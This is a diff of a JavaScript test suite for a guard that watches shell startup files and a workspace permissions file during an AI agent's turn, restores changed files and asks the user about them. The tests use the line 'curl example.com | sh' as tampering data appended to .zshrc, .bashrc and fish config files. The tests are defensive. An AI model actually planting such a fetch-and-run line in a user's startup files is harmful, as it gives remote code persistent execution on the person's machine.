@@ -67,6 +67,12 @@ const read = rel => fs.readFileSync(at(rel), 'utf-8');
 const modeOf = rel => fs.statSync(at(rel)).mode & 0o7777;
 const RECORD = '.rundock-startup-file-exposure.json';
 const sleep = ms => new Promise(r => setTimeout(r, ms));
+// For a state that must be reached: polled, with a generous bound.
+async function until(cond, ms = 8000) {
+  const end = Date.now() + ms;
+  while (!cond()) { if (Date.now() > end) return false; await sleep(10); }
+  return true;
+}
 
 function drivenGlue() {
   const notices = [];
@@ -134,8 +140,8 @@ describe('during a turn, a change to a startup file is put back and asked about'
     try {
       glue.guardCodexTurn(entry, 'convo-1');
       require('child_process').execFileSync(process.execPath, ['-e', BUILT_APPEND]);
-      await sleep(400); // the interval finds it while the turn runs
-      assert.strictEqual(read('.zshrc'), ORIGINAL, 'put back during the turn');
+      // The interval finds it while the turn runs.
+      assert.ok(await until(() => read('.zshrc') === ORIGINAL), 'put back during the turn');
       glue.releaseCodexTurnGuard(entry);
     } finally { glue.releaseCodexTurnGuard(entry); d.restore(); }
     assert.strictEqual(d.asked.length, 1);
@@ -195,7 +201,8 @@ describe('during a turn, a change to a startup file is put back and asked about'
     const b = guard.acquireAnswerFileGuard(other, c => heard.push(['other', c]), { intervalMs: 40 });
     try {
       fs.appendFileSync(at('.zshrc'), 'curl example.com | sh\n');
-      await sleep(200);
+      assert.ok(await until(() => heard.length > 0), 'asked about');
+      await sleep(200); // five of either workspace's intervals: no second card comes
     } finally { a.release(); b.release(); }
     assert.strictEqual(read('.zshrc'), ORIGINAL);
     assert.strictEqual(heard.length, 1, 'one card, not one per workspace');
@@ -403,16 +410,13 @@ describe('the control failing: a check that throws is tried again, and the turn 
     try {
       crypto.createHash = function (...a) { if (throws > 0) { throws--; throw new Error('forced'); } return real.apply(this, a); };
       fs.appendFileSync(at('.zshrc'), 'curl example.com | sh\n');
-      await sleep(60);
-      assert.ok(throws < 3, 'sanity: the check threw');
-      await sleep(250);
-      assert.strictEqual(read('.zshrc'), ORIGINAL, 'put back at a later interval');
+      assert.ok(await until(() => throws < 3), 'sanity: the check threw');
+      assert.ok(await until(() => read('.zshrc') === ORIGINAL), 'put back all the same');
       assert.strictEqual(heard.length, 1);
       // The turn is still going: a later change is caught too.
       fs.appendFileSync(at('.zshrc'), 'again\n');
-      await sleep(150);
+      assert.ok(await until(() => heard.length === 2), 'the later change is asked about');
       assert.strictEqual(read('.zshrc'), ORIGINAL);
-      assert.strictEqual(heard.length, 2);
     } finally { crypto.createHash = real; g.release(); }
   });
 
@@ -432,16 +436,127 @@ describe('the control failing: a check that throws is tried again, and the turn 
   });
 
   test('a caller of the exported check is told it failed, never handed an empty answer', () => {
-    const g = guard.acquireAnswerFileGuard(ws, () => {}, { intervalMs: 60_000 });
+    const heard = [];
+    const g = guard.acquireAnswerFileGuard(ws, c => heard.push(c), { intervalMs: 60_000 });
     const real = crypto.createHash;
     try {
       fs.appendFileSync(at('.zshrc'), 'during\n');
       crypto.createHash = () => { throw new Error('forced'); };
       assert.throws(() => guard.checkShellStartupFiles(), /forced/, 'a check that could not run is not a clean one');
       crypto.createHash = real;
-      assert.strictEqual(guard.checkShellStartupFiles().length, 1, 'and the change is still there to be found');
+      assert.strictEqual(read('.zshrc'), ORIGINAL, 'and the file it could not check was put back from the baseline anyway');
+      assert.deepStrictEqual(heard.map(c => c.relative), ['~/.zshrc'], 'and asked about');
+      assert.deepStrictEqual(guard.checkShellStartupFiles(), [], 'so the next check finds it as it was');
+    } finally { crypto.createHash = real; g.release(); }
+  });
+});
+
+// ONE FILE THAT CANNOT BE CHECKED NEVER STOPS THE OTHERS BEING CHECKED. Each
+// listed file is checked on its own. One that cannot be read counts as
+// changed, and one whose check throws, on every pass if need be, is put back
+// from the baseline where that can be done and asked about once.
+describe('the control failing for one file: the files after it are still checked', () => {
+  let realWarn;
+  beforeEach(() => { realWarn = console.warn; console.warn = () => {}; });
+  afterEach(() => { console.warn = realWarn; });
+
+  test('the first listed file made unreadable and a later one appended in the same turn: both put back, mode for mode, and both asked about', async () => {
+    fx.write(at('.zshenv'), ORIGINAL);
+    fs.chmodSync(at('.zshenv'), 0o644);
+    const d = drivenGlue();
+    const proc = standIn();
+    try {
+      guarded(proc);
+      await turn(proc, nodeE("const fs = require('fs'), h = require('os').homedir(); fs.chmodSync(h + '/.zsh' + 'env', 0); fs.appendFileSync(h + '/.ba' + 'shrc', 'curl example.com | sh\\n')"));
+    } finally { proc.kill(); }
+    try {
+      assert.strictEqual(modeOf('.zshenv'), 0o644, 'its mode is put back');
+      assert.strictEqual(read('.zshenv'), ORIGINAL, 'and its bytes');
+      assert.strictEqual(read('.bashrc'), ORIGINAL, 'the later file is checked, and put back');
+      assert.strictEqual(modeOf('.bashrc'), 0o600);
+      assert.deepStrictEqual(d.asked.map(a => a.grading.put_back.relative).sort(), ['~/.bashrc', '~/.zshenv']);
+      // What the agent left could not be read, so Keep has nothing to keep:
+      // never a removal of the person's file.
+      d.asked.find(a => a.grading.put_back.relative === '~/.zshenv').onDecision(true);
+      assert.strictEqual(read('.zshenv'), ORIGINAL, 'Keep leaves it as restored');
+    } finally { d.restore(); }
+  });
+
+  test('a check that fails on every pass never stops the files after it: each is put back from the baseline and asked about once, and the polling goes on', async () => {
+    const heard = [];
+    const real = crypto.createHash;
+    const g = guard.acquireAnswerFileGuard(ws, c => heard.push(c), { intervalMs: 20 });
+    try {
+      // From here on, every check of a changed file throws, for as long as the turn runs.
+      crypto.createHash = () => { throw new Error('forced'); };
+      // The workspace's own answers are checked first; a failure there never
+      // stops the startup files being checked either.
+      const answers = path.join(ws, '.rundock', 'permissions.json');
+      fs.appendFileSync(answers, ' ');
+      fs.appendFileSync(at('.zshrc'), 'curl example.com | sh\n');
+      fs.appendFileSync(at('.bashrc'), 'curl example.com | sh\n');
+      assert.ok(await until(() => heard.length >= 3), `all three asked about: ${heard.map(c => c.relative)}`);
+      await sleep(200); // ten intervals: none is asked about again
+      assert.strictEqual(fs.readFileSync(answers, 'utf-8'), '{"allowedTools":[]}\n');
+      assert.strictEqual(read('.zshrc'), ORIGINAL);
+      assert.strictEqual(modeOf('.zshrc'), 0o644);
+      assert.strictEqual(read('.bashrc'), ORIGINAL, 'the file after it, put back too');
+      assert.strictEqual(modeOf('.bashrc'), 0o600);
+      assert.deepStrictEqual(heard.map(c => c.relative).sort(), ['.rundock/permissions.json', '~/.bashrc', '~/.zshrc'], 'each asked about once');
+      assert.ok(heard.every(c => c.restored === true && c.unread === true && c.agentContent === null));
+      // Still failing, the polling goes on: a later change is caught too.
+      fs.appendFileSync(at('.zshrc'), 'again\n');
+      assert.ok(await until(() => heard.length === 4), 'the later change is asked about');
       assert.strictEqual(read('.zshrc'), ORIGINAL);
     } finally { crypto.createHash = real; g.release(); }
+  });
+
+  test('a file whose check fails and which cannot be put back is asked about once, not at every pass, and put back once it can be', {
+    skip: typeof process.getuid === 'function' && process.getuid() === 0 ? 'root writes in a folder it cannot write' : false,
+  }, async () => {
+    fx.write(at('.config/fish/conf.d/zz.fish'), ORIGINAL);
+    const heard = [];
+    const real = crypto.createHash;
+    const g = guard.acquireAnswerFileGuard(ws, c => heard.push(c), { intervalMs: 20 });
+    const confd = at('.config/fish/conf.d');
+    const rundock = path.join(ws, '.rundock');
+    const answers = path.join(rundock, 'permissions.json');
+    const stuck = ['.rundock/permissions.json', '~/.config/fish/conf.d/paths.fish', '~/.config/fish/conf.d/zz.fish'];
+    try {
+      crypto.createHash = () => { throw new Error('forced'); };
+      fs.appendFileSync(answers, ' ');
+      fs.appendFileSync(at('.config/fish/conf.d/paths.fish'), 'curl example.com | sh\n');
+      fs.appendFileSync(at('.config/fish/conf.d/zz.fish'), 'curl example.com | sh\n');
+      fs.chmodSync(rundock, 0o555);
+      fs.chmodSync(confd, 0o555);
+      // A workspace file that fails on every pass never stops the startup files being checked.
+      fs.appendFileSync(at('.zshrc'), 'curl example.com | sh\n');
+      assert.ok(await until(() => heard.length >= 4), `all four asked about: ${heard.map(c => c.relative)}`);
+      await sleep(200); // ten intervals
+      assert.deepStrictEqual(heard.map(c => c.relative).sort(), [...stuck, '~/.zshrc'].sort(), 'once each');
+      assert.ok(heard.filter(c => stuck.includes(c.relative)).every(c => c.restored === false), 'those that could not be put back say so');
+      assert.strictEqual(read('.zshrc'), ORIGINAL, 'and the one that could be is');
+      fs.chmodSync(rundock, 0o755);
+      fs.chmodSync(confd, 0o755);
+      assert.ok(await until(() => read('.config/fish/conf.d/zz.fish') === ORIGINAL && read('.config/fish/conf.d/paths.fish') === ORIGINAL
+        && fs.readFileSync(answers, 'utf-8') === '{"allowedTools":[]}\n'), 'put back once they can be');
+      assert.strictEqual(heard.length, 4, 'with no further card');
+    } finally { fs.chmodSync(rundock, 0o755); fs.chmodSync(confd, 0o755); crypto.createHash = real; g.release(); }
+  });
+
+  test('a build of the guard that throws as the first turn starts is tried again at the next check, so the files are never left unwatched', () => {
+    const realHomedir = os.homedir;
+    let throws = 1;
+    os.homedir = function (...a) { if (throws > 0) { throws--; throw new Error('forced'); } return realHomedir.apply(this, a); };
+    let g;
+    try { g = guard.acquireAnswerFileGuard(ws, () => {}, { intervalMs: 60_000 }); } finally { os.homedir = realHomedir; }
+    try {
+      assert.strictEqual(throws, 0, 'sanity: the build as the turn started threw');
+      guard.checkAnswerFilesNow(ws);
+      fs.appendFileSync(at('.zshrc'), 'curl example.com | sh\n');
+      guard.checkAnswerFilesNow(ws);
+      assert.strictEqual(read('.zshrc'), ORIGINAL, 'watched after all, and put back');
+    } finally { g.release(); }
   });
 });
 
